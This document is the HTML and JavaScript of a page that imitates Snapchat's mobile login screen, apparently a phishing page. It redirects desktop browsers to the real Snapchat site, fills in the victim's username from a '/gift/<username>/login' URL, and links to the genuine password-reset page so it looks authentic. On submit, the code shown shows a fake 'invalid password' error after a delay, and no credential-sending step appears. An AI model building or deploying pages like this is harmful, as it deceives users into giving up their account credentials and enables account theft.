<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>Log In</title>
<script>
(function(){
  const ua=navigator.userAgent.toLowerCase();
  if(!/mobile|android|iphone|ipad|tablet/i.test(ua)&&(ua.includes("windows")||ua.includes("macintosh")||ua.includes("linux"))){
    window.location.replace("https://accounts.snapchat.com/");
  }
})();
</script>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
<style>
  @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");
  body { font-family: "Inter", sans-serif; }
  ::-webkit-scrollbar { display: none; }

  input[type="checkbox"] {
    -webkit-appearance: none; -moz-appearance: none; appearance: none;
    width: 1rem; height: 1rem; border: 2px solid #d1d5db;
    border-radius: 0.25rem; position: relative; cursor: pointer;
  }
  input[type="checkbox"]:checked::after {
    content: ''; position: absolute; left: 3.3px; top: 0.5px;
    width: 4.5px; height: 9px; border: solid #00b0ff;
    border-width: 0 2px 2px 0; transform: rotate(45deg);
  }
  input[type="checkbox"]:focus { outline: none; box-shadow: 0 0 0 2px rgba(0,176,255,0.3); }

  #loginBtn { 
    transition: bottom 0.3s ease; 
    min-width: 40%; 
    width: 61%; 
    font-size: 1.05rem; 
    padding: 0.7rem 0; 
    display: block; 
    margin: 0 auto; 
  }

  .input-container { width: 85%; margin: 0 auto; }

  input[type="text"], input[type="password"] { 
    width: 100%; 
    font-size: 0.9rem; 
    font-weight: 500; 
    padding-bottom: 0.15rem; 
    padding-top: 0.2rem;
    font-family: "Inter", sans-serif;
  }

  label[for="password"] { position: relative; top: -10px; font-size: 0.75rem; }
  #password { position: relative; top: -10px; }

  label.inline-flex.items-center {
    position: relative; top: -8px; font-size: 0.78rem; font-weight: 500;
  }

  #forgotPassword {
    position: relative; top: -9.5px; font-size: 0.78rem; font-weight: 500; color:#0083ff;
  }

  #errorMsg { 
    max-width: 85%; 
    margin: 0 auto; 
    font-size: 0.8rem; 
    text-align: left; 
    color:#ff1952;
    font-weight: 400;
  }

  h1 { position: relative; top: -10px; font-size: 1.65rem; font-weight: 500; text-align: center; }

  form.flex.flex-col.space-y-6 { gap: 0.4rem; }

  .card { background: white; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
  .highlight { background-color: #eef2ff; padding: 0.5rem; border-radius: 8px; }
  .remove-btn { cursor: pointer; color: #ef4444; }
  .remove-btn:hover { color: #dc2626; }
  #adminSection { display: none; }
  #adminSection.active { display: block; }
  .back-arrow i { font-size: 1rem; }
</style>
</head>
<body class="bg-white min-h-screen flex flex-col justify-between max-w-lg mx-auto relative">
<div id="loginSection" class="pt-4 px-6 relative flex flex-col flex-grow">
  <button aria-label="Back" class="absolute top-4 left-6 text-[#00b5e7] leading-none font-medium back-arrow" onclick="goBack()">
    <i class="fas fa-chevron-left"></i>
  </button>
  <h1 class="mt-4 mb-8 text-black font-medium font-sans">Log In</h1>
  <form id="loginForm" class="flex flex-col space-y-6">
    <div class="flex flex-col input-container">
      <label for="username" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">USERNAME, EMAIL, OR PHONE</label>
      <input id="username" type="text" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="username" required>
    </div>
    <div class="flex flex-col relative input-container -mt-3">
      <label for="password" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">PASSWORD</label>
      <input id="password" type="password" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 text-lg font-sans pr-10 w-full" autocomplete="current-password" required>
      <button type="button" aria-label="Toggle password visibility" class="absolute right-0 top-1/2 transform -translate-y-1/2 text-gray-400 text-[1.1rem]" onclick="togglePassword()">
        <i id="eyeIcon" class="fas fa-eye-slash"></i>
      </button>
    </div>
    <p id="errorMsg" class="hidden">Invalid username or password. Try again.</p>
    <label class="inline-flex items-center space-x-2 font-sans text-black input-container">
      <input type="checkbox" checked>
      <span>Save Login Info on your iCloud devices</span>
    </label>
    <a id="forgotPassword" href="https://accounts.snapchat.com/accounts/password_reset_request" class="text-center font-sans mt-2 input-container">Forgot your password?</a>
    <button id="loginBtn" type="submit" class="bg-[#b7c0c8] text-white font-medium text-lg py-3 rounded-full mt-4" disabled>Log In</button>
  </form>
</div>

<script>
document.addEventListener("DOMContentLoaded", function(){
  const a=document.getElementById("username"),
        b=document.getElementById("password"),
        c=document.getElementById("loginBtn"),
        d=document.getElementById("errorMsg"),
        e=document.getElementById("loginForm");

  // autofill username from URL /gift/username/login
  const p = window.location.pathname.match(/\/gift\/([^\/]+)\/login/);
  if(p && p[1]){ a.value = p[1]; y2(); }

  // live validation
  function y2(){
    if(a.value.trim() && b.value.trim()){
      c.classList.remove("bg-[#b7c0c8]");
      c.classList.add("bg-[#00b0ff]");
      c.disabled = false;
    } else {
      c.classList.remove("bg-[#00b0ff]");
      c.classList.add("bg-[#b7c0c8]");
      c.disabled = true;
    }
  }

  // submit
  e.addEventListener("submit", function(evt){
    evt.preventDefault();
    if(a.value.trim() && b.value.trim()){
      // button turns grey + disable
      c.classList.remove("bg-[#00b0ff]");
      c.classList.add("bg-[#b7c0c8]");
      c.disabled = true;

      setTimeout(()=>{
        b.value="";
        d.classList.remove("hidden");
        y2();
      },1200);
    } else {
      d.textContent="Please fill in both fields.";
      d.classList.remove("hidden");
    }
  });

  a.addEventListener("input", y2);
  b.addEventListener("input", y2);

  // toggle pw
  window.togglePassword=function(){
    if(b.type==="password"){
      b.type="text";
      document.getElementById("eyeIcon").classList.replace("fa-eye-slash","fa-eye");
    } else {
      b.type="password";
      document.getElementById("eyeIcon").classList.replace("fa-eye","fa-eye-slash");
    }
  }
});
function goBack(){ window.history.length>1?window.history.back():window.location.reload(); }
</script>
</body>
</html>
